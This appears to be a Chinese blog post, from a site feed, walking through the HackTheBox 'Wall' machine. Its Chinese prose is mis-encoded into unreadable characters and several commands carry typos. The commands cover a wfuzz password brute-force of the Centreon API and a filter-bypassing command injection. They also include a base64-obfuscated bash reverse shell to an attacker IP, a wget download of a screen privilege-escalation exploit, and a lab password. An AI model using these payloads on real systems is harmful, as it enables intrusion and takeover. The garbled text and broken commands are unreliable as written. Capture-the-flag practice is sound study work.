·æˆ‘ä»¬å°±åˆ›å»ºå¥½äº†ä¸é¶æœºä¹‹é—´çš„è™šæ‹Ÿä¸“æœ‰ç½‘ç»œã€‚å¯ä»¥è®¿é—®åˆ°é¢˜ç›®ã€‚</p><p>ä¹‹åå°±æ˜¯é¢å¯¹hacktheboxä¸Šä¸€ä¼—é¶æœºçš„å¸¸è§„å¥—è·¯ï¼šä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æï¼ˆè¿™åº”è¯¥ä¹Ÿæ˜¯æ­£å¸¸æ¸—é€è¿‡ç¨‹ä¸­çš„ç¬¬ä¸€æ­¥ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sC -sV -oA namp&#x2F;wall 10.10.10.157</span><br></pre></td></tr></table></figure><p>æˆ‘å­¦ä¹ äº†ä¸‹é‚£ä½youtuberçš„å¥½ä¹ æƒ¯ï¼Œè¿™é‡Œnampä¸ä»…åšäº†æ‰«æï¼ŒåŒæ—¶è¿˜ä¿å­˜ä¸ºæ–‡ä»¶æ–¹ä¾¿å›é¡¾ã€‚</p><p>ä¹‹åå‘ç°å¼€æ”¾äº†ä¸¤ä¸ªç«¯å£ï¼Œ80ä¸22,ä¹Ÿå°±æ˜¯httpä¸sshå¯¹åº”æœåŠ¡ã€‚å°è¯•ç›´æ¥è®¿é—®ï¼Œä¹Ÿå¾—åˆ°äº†apacheçš„é»˜è®¤é¡µé¢ã€‚åŸºäºsshå¹¶æ— å¤ªå¤šåˆ©ç”¨ä¹‹å¤„ï¼Œå¯ä»¥ç›´æ¥ä»webé¡µé¢ä¸‹æ‰‹ã€‚<br>é‚£ä¹ˆå…ˆæ‰«ä¸‹ç›®å½•ï¼Œæ¥çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯èƒ½æœ‰è¶£çš„,åœ¨ç®€å•çš„FUZZä¸€ä¸‹robots.txt,.htacesséƒ½æ— ç»“æœåï¼Œæœæ–­ä½¿ç”¨gobusterï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;10.10.10.157&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure><p>æ‰«åˆ°äº†ä¸€ä¸ª/monitoringï¼Œå°è¯•è®¿é—®ï¼Œå´å‘ç°æç¤ºunauthorizedã€‚å¹¶æç¤ºè¾“å…¥ç”¨æˆ·å¯†ç ï¼Œå°è¯•ä¸‹admin-admin,admin-password,guest-guestç­‰ç­‰å¯èƒ½çš„å¼±å£ä»¤æ— æœï¼Œäºæ˜¯å¾—å¦è¾Ÿè¹Šå¾„ã€‚<br>é¡ºä¾¿è¡¥ä¸€ä¸‹webAPIä¸­authorizeè·Ÿauthenticationçš„åŒºåˆ«ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">èº«ä»½éªŒè¯ï¼ˆAuthenticationï¼‰ï¼šç¡®å®šç”¨æˆ·æ˜¯è°ã€‚</span><br><span class="line"></span><br><span class="line">æˆæƒ(Authorization)ï¼šç¡®å®šç”¨æˆ·èƒ½åšä»€ä¹ˆï¼Œä¸èƒ½åšä»€ä¹ˆã€‚</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä»dalaoé‚£å­¦åˆ°äº†ä¸€æ‹›ï¼šæŠ“åŒ…åï¼Œå½“ä»¥GETæ–¹å¼è®¿é—®/monitoringæ—¶ï¼Œæˆ‘ä»¬å¾—åˆ°çš„æ˜¯401 unauthorized,ä½†å¦‚æœä»¥POSTæ–¹å¼è®¿é—®ï¼Œå°±ä¼šçš„åˆ°é¡µé¢æç¤ºï¼Œå¹¶æ‹¿åˆ°åç»­æ“ä½œçš„é¡µé¢ç›®å½•  /centreon</p><p>å†åº¦è®¿é—®ï¼Œç»ˆäºå¾—åˆ°ä¸€ä¸ªcentreonçš„ç™»å½•ç•Œé¢ï¼ŒåŒæ—¶ç‰ˆæœ¬ä¸º19.04.0é‚£ä¹ˆé—®é¢˜å°±å›åˆ°ç”¨æˆ·å¯†ç ä¸Šäº†ã€‚<br>ä¸ºäº†èƒ½äº†è§£è¿™ä¸€ç³»ç»Ÿï¼Œå½“ç„¶éœ€è¦è°·æ­Œäº†è§£ä¸‹centreonåˆ°åº•ä¸ºä½•ç‰©ï¼Œä»¥åŠæœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ã€‚å¾ˆå¿«å°±å¯ä»¥å‘ç°ï¼Œè¿™ä¸€ç‰ˆæœ¬å­˜åœ¨æœ‰sqlæ³¨å…¥ï¼ŒRCEå‘½ä»¤æ‰§è¡Œç­‰ç­‰æ¼æ´ï¼›æˆ–è€…ä½¿ç”¨kaliä¸Šçš„searchspolit</p><figure class="highlight plain"><figcaption><span>centreon```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å‘ç°æœ‰RCEç­‰ç­‰æ¼æ´ä»¥åŠåˆ©ç”¨ï¼Œæˆ‘ä»¬å¯¹RCEgetshellç›¸å¯¹æ¯”è¾ƒè½»æ¾ï¼Œé‚£ä¹ˆå°±ä¸å¦¨çœ‹çœ‹RCEçš„åˆ©ç”¨</span><br><span class="line">&#96;&#96;&#96; searchsploit  -x &quot;æ­¤å¤„æ¥åˆ©ç”¨çš„è„šæœ¬æ–‡ä»¶åœ°å€&quot;</span><br></pre></td></tr></table></figure><p>ä»”ç»†å®¡è¿‡åå‘ç°ï¼Œä»ä¸Šé¢æåˆ°çš„ç§ç§æ¼æ´åˆ°ç°åœ¨å…·ä½“çš„RCEï¼Œæˆ‘ä»¬éƒ½éœ€è¦åœ¨autheticatedçš„å‰æä¸‹åˆ©ç”¨ï¼Œé‚£ä¹ˆè¿˜æ˜¯å¾—ä»ç™»é™†ç•Œé¢çš„ç”¨æˆ·å¯†ç ä¸‹æ‰‹ã€‚</p><p>è¿™é‡Œåˆä»å¤§ä½¬é‚£å­¦åˆ°äº†ç¬¬äºŒæ‹›ï¼šåœ¨ç™»å½•ç•Œé¢éšä¾¿è¾“å…¥å°è¯•ç™»å½•å¹¶æŠ“åŒ…æ—¶ï¼Œä¼šå‘ç°burpæŠ“åŒ…å¾—å†…å®¹é™¤äº†admin,passwordå‚æ•°ï¼Œè¿˜ä¼šæœ‰centreonè‡ªå¸¦çš„tokenã€‚è¿™å°±ç»™æˆ‘ä»¬çš„æš´åŠ›ç ´è§£å¯èƒ½æ€§ç”»ä¸Šäº†å¥å·ã€‚é‚£ä¹ˆè¿˜æœ‰å…¶ä»–æ–¹æ³•çˆ†ç ´å—ï¼Ÿæœ‰çš„ï¼Œé€šè¿‡APIæ¥å°è¯•ï¼š googleåå‘ç°ç¡®å®å­˜åœ¨centreonçš„api,è€Œä¸”ç¡®å®åªä¼ äº†username,passwordä¸¤ä¸ªå‚æ•°ï¼Œæ˜¯å¯ä»¥çˆ†ç ´çš„ã€‚<br>ä¹‹åç»§ç»­FUZZï¼Œäºæ˜¯å‡†å¤‡postè®¿é—®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate</span><br></pre></td></tr></table></figure><p>å¹¶é¡ºä¾¿ä¼ å‚admin=admin&amp;password=passowrdã€‚å‘ç°è¿”å›bad crendentialsã€‚å¹¶ä¸”æ”¹æ‰usernameå‚æ•°æ—¶è¿”å›çš„æ˜¯ä¸€è‡´çš„ï¼Œè¿™æ ·å°±ä¸å¥½é€šè¿‡responseæ¥çˆ†ç ´ã€‚é‚£åªèƒ½çŒœæµ‹ç”¨æˆ·åæ˜¯adminäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz  http:&#x2F;&#x2F;10.10.10.157&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate -w &#x2F;usr&#x2F;share&#x2F;seclist&#x2F;Passwords&#x2F;darkweb2017-top1000.txt  -d &quot;username&#x3D;admin&amp;password&#x3D;FUZZ&quot; --hc 403</span><br></pre></td></tr></table></figure><p>â€“hc å¯ä»¥ç­›æ‰è¿”å›403çš„ç»“æœã€‚<br>ä¸Šé¢ç”¨çš„è¿™ä¸ªå­—å…¸æˆ‘å¥½åƒkaliä¸Šå¹¶æ²¡æœ‰ï¼Œåªèƒ½è‡ªå·±æ‰¾å­—å…¸ç”¨äº†ã€‚<br>å¾ˆå¿«å¾—åˆ°æ­£ç¡®çš„å¯†ç  password1â€¦â€¦è¿™ä¸ªå¼±å£ä»¤çœŸçš„æ˜¯å¼ºï¼Œç®€å•å½’ç®€å•ï¼Œæ€»å½’äººæ‰‹FUZZåº”è¯¥ä¸å¤ªèƒ½FUZZå‡ºæ¥â€¦â€¦</p><p>ä¹‹åå°±æˆåŠŸç™»é™†ï¼Œè½®åˆ°æˆ‘ä»¬å¤§å±•èº«æ‰‹äº†ã€‚åœ¨ç½‘ä¸Šå¯ä»¥æŸ¥åˆ°å¾ˆå¤šç§åˆ©ç”¨ï¼Œæˆ‘å‚è€ƒäº†dalaoçš„é‚£ç§å‘½ä»¤æ‰§è¡Œï¼ˆåƒè¿™ç§æ§åˆ¶å°é‡Œçš„ç¡®å­˜åœ¨å¾ˆå¤šå¯ä»¥æ³¨å…¥åˆ©ç”¨çš„åœ°æ–¹ï¼‰åœ¨centreonçš„configurationä¸­å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ,ç®€å•è¯•ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 127.0.0.1;</span><br></pre></td></tr></table></figure><p>linuxçš„pingè²Œä¼¼ä¸windowsæœ‰åŒºåˆ«ã€‚<br>ç„¶è€Œåœ¨å‘½ä»¤æ‰§è¡Œæ—¶å¤±è´¥äº†å¹¶è¿”å›403ã€‚ç»§ç»­å°è¯•å…¶ä»–çš„å‘ç°å¯èƒ½æ˜¯è¿‡æ»¤äº†ç©ºæ ¼ã€‚äºæ˜¯ä½¿ç”¨å¸¸è§çš„ä¸€ç§ç»•è¿‡æ‰‹æ®µï¼š<code>${IFS}</code>ç»•è¿‡ç©ºæ ¼ã€‚<br>å¦å¤–ï¼Œæˆ‘è¿˜å­¦åˆ°äº†æœ‰åˆ«äºè‡ªå·±åŸæ¥åƒåœ¾çš„æŠŠç©ºæ ¼ä¸€ä¸ªä¸ªæ¢æˆ${IFS}çš„æ‰‹æ®µã€‚ç›´æ¥åœ¨linuxå‘½ä»¤è¡Œä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;ping -c 1 127.0.0.1;&#39;|sed  &#39;s&#x2F; &#x2F;$&#123;IFS&#125;&#x2F;g&#39;</span><br></pre></td></tr></table></figure><p>å°±å¾—åˆ°äº†payload ,å†åº¦æ”¾åœ¨åˆšåˆšçš„å‘½ä»¤æ‰§è¡Œç©ºæ ¼ä¸­ï¼Œä¿å­˜ï¼Œå¹¶export configurationä»¥æ‰§è¡Œå‘½ä»¤ã€‚å‘ç°æˆåŠŸäº†ã€‚<br>æ—¢ç„¶æµ‹è¯•å¥½äº†ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥getshellå§ã€‚<br>åŸpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;8888 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œbash -c æ˜¯ç›´æ¥å°†åé¢çš„å­—ç¬¦ä¸²å†…å®¹æ‰§è¡Œå‘½ä»¤ã€‚è€Œåé¢bash -iç­‰ç­‰å°±æ˜¯bashåå¼¹shellçš„å‘½ä»¤äº†ã€‚(è¿™é‡Œè‡ªå·±å…¶å®è‡ªå­¦äº†å¥½ä¹…ï¼Œä¹ŸæŠ˜è…¾äº†ä¸æ™’æ—¶é—´æ‰æˆåŠŸåœ¨kaliä¸Šæ‹¿åˆ°è‡ªå·±çš„ä¸€å°å…¬ç½‘vpsçš„shellï¼Œä¹‹åå¦‚æœå†™å­¦ä¹ ç¬”è®°å†è¯¦ç»†è§£é‡Šç†è§£ä¸‹)<br>è¿™é‡Œä¸å¦¨ç”¨base64ç¼–ç ä¸‹ç»•æ£€æŸ¥,æˆ‘ä¹Ÿä¸è®°å¾—è¿™é‡Œä¸ç”¨base64ç¼–ç æ˜¯å¦ä¼šäº§ç”Ÿè¢«è¿‡æ»¤bashçš„é—®é¢˜ï¼Œä½†æ¯•ç«Ÿbashæ˜¯é«˜å±å‘½ä»¤ï¼Œè¿˜æ˜¯æ‰§è¡Œç¼–ç ä¸ºå¦™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;8888 0&gt;&amp;1&#39; &quot;|base 64</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç»•è¿‡ç©ºæ ¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D; | base4 -d | bash&quot; |sed &#39;s&#x2F; &#x2F;$&#123;IFS&#125;&#x2F;g&#39;</span><br></pre></td></tr></table></figure><p>ç°payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$&#123;IFS&#125;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D;$&#123;IFS&#125;|$&#123;IFS&#125;base4$&#123;IFS&#125;-d$&#123;IFS&#125;|$&#123;IFS&#125;bash;</span><br></pre></td></tr></table></figure><p>è®°å¾—æœ€åè¦æœ‰åˆ†å·ã€‚ä¹‹ååœ¨è‡ªå·±kaliä¸Šç›‘å¬8888ç«¯å£ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡Œå³å¯getshellã€‚</p><h2 id="æ‹¿-user-æƒé™"><a href="#æ‹¿-user-æƒé™" class="headerlink" title="æ‹¿ user æƒé™"></a>æ‹¿ user æƒé™</h2><p>hacktheboxçš„é¶æœºæ‹¿ä¸‹ï¼Œå¹¶ä¸åªæ˜¯ç®€å•çš„getshell,è€Œæ˜¯è¦åˆ†åˆ«æ‹¿åˆ°rootæƒé™ä¸useræƒé™ä¸‹çš„ä¸¤ä¸ªæ–‡ä»¶ä¸­çš„flagæäº¤æ‰ç®—æˆåŠŸã€‚è¿™é‡Œè‡ªå·±å› ä¸ºæ²¡ä»€ä¹ˆææƒç»éªŒï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå‚è€ƒäº†ä¸å°‘wpä¸è§†é¢‘æ‰ç®—æˆåŠŸã€‚<br>å…ˆä»ç®€å•çš„userå¼€å§‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure><p>å‘ç°useræœ‰shelbyä¸sysmonitorä¸¤ä¸ªã€‚æ‰¾ä¸€ä¸‹shelbyçš„å†…å®¹åå‘ç°åªæœ‰shelbyæœ‰æƒé™è¯»user.txtå³flagã€‚<br>ç»è¿‡ä¸€ç•ªæŒ–æ˜ï¼Œå¯ä»¥å‘ç°èƒ½å¤Ÿæ‰¾åˆ°/opt/.shelby/backupè¿™ä¸€æ–‡ä»¶ã€‚<code>file backup</code>åå‘ç°æ˜¯ä¸€ä¸ªpythonç¼–è¯‘æ–‡ä»¶ï¼Œå¯èƒ½å°±æ˜¯pycå§ã€‚æ‰§è¡Œä¸‹<code>python backup</code><br>è¿™æ—¶æˆ‘ä»¬å¦‚æœå†ls -laï¼Œå°±ä¼šå‘ç°æˆ‘ä»¬ä¸çŸ¥æ€ä¹ˆå·²ç»å®Œæˆäº†authenticationã€‚<br>è¿›å…¥ç›®å½•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 backup</span><br></pre></td></tr></table></figure><p>å°†ç»“æœåœ¨æœ¬æœºçš„vimä¿å­˜ä¸ºbackup.pyc.b64ï¼Œå†base64è§£ç ï¼Œè¿™æ ·è¿™æ ·ä¸€ä¸ªpycæ–‡ä»¶å°±ç®—åˆ°äº†æœ¬æœºäº†ã€‚ç„¶åæˆ‘ä»¬ç”¨python çš„uncompyleåº“åç¼–è¯‘ä¸€ä¸‹ã€‚è¿˜åŸäº†pyæ–‡ä»¶ã€‚<br>ä»å…¶ä¸­ç›´æ¥æ‹¿åˆ°shelby çš„å¯†ç  ShelbyPassw@rdIsStrong!<br>sshç™»å½•shelbyå³å¯è¯»user.txtã€‚</p><h2 id="æ‹¿-root-æƒé™"><a href="#æ‹¿-root-æƒé™" class="headerlink" title="æ‹¿ root æƒé™"></a>æ‹¿ root æƒé™</h2><p>æ‹¿rootæƒé™æ—¶æˆ‘å°±æ¯”è¾ƒå°´å°¬äº†ï¼Œå› ä¸ºè¿™é‡Œrootçš„payloadå¯ä»¥ç›´æ¥æ‹¿åˆ°rootè·ŸshelbyäºŒè€…çš„æƒé™ã€‚<br>å‚è€ƒäº†ä¸€ä¸ªè§£æ³•ï¼š</p><blockquote><p>/bin/screen-4.5.0<br>For this exact version there is a vulnerability that allows to escalate to root</p></blockquote><p>è¿™é‡Œ/binä¸‹çš„screenç‰ˆæœ¬å…è®¸æˆ‘ä»¬ç›´æ¥åˆ©ç”¨æ¼æ´æ‹¿åˆ°rootæƒé™ã€‚payloadåœ¨æ­¤ï¼š<a href="https://github.com/XiphosResearch/exploits/tree/master/screen2root" target="_blank" rel="noopener">https://github.com/XiphosResearch/exploits/tree/master/screen2root</a><br>é‚£æ¥ä¸‹æ¥åªç”¨æŠŠè„šæœ¬æ”¾åˆ°æˆ‘ä»¬æ‹¿åˆ°shellçš„æœºå­æ‰§è¡Œscreenroot.shå³å¯ã€‚é‚£ä¹ˆå¦‚ä½•ä¼ è¾“æ–‡ä»¶å‘¢ï¼Ÿè¿™é‡Œè¿ç”¨åˆ°äº†pythonå¼ºå¤§çš„åŠŸèƒ½ï¼Œä¹Ÿæ˜¯è‡ªå·±ä¹‹å‰æ›¾ç”¨è¿‡çš„SimpleHTTPServer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpliHTTPServer</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±é»˜è®¤ç›‘å¬8000ç«¯å£äº†ï¼Œå…ˆæŠŠè„šæœ¬æ”¾åœ¨æ ¹ç›®å½•ã€‚å°è¯•<code>curl 10.10.14.3:8000/screenroot.sh</code>å¤±è´¥,æ²¡æœ‰å®‰è£…curlã€‚å†å°è¯•<code>wget 10.10.14.3:8000/screenroot.sh</code>æˆåŠŸï¼Œåœ¨é¶æœºshellæ‹¿åˆ°è„šæœ¬ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash screenroot.sh</span><br></pre></td></tr></table></figure><p>è¿è¡ŒæˆåŠŸï¼Œè¿›å…¥shellçš„äº¤äº’é¡µé¢ã€‚cat /root/root.txtå³å¯ï¼Œè¿˜å¯ä»¥cat /home/shelby/user.txtæ‹¿åˆ°ä¹‹å‰çš„userflagã€‚</p><p>å¤§æŠµå¦‚æ­¤å§ã€‚å½“æ—¶å³ä½¿åœ¨å‚è€ƒï¼Œè‡ªå·±ä¹ŸèŠ±äº†ä¸å°‘æ—¶é—´åœ¨getshellåçš„ææƒä¸Šï¼Œçœ‹æ¥è‡ªå·±è¿˜è¦å†å¤šåŠ äº†è§£å­¦ä¹ å‘€ã€‚å¯’å‡å·²ç»å¼€å§‹ï¼Œæˆ‘ä¹Ÿäº‰å–å†æ‹¼ä¸€æŠŠï¼Œå¤šå­¦ä¸€äº›webæ–¹é¢çš„çŸ¥è¯†å§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
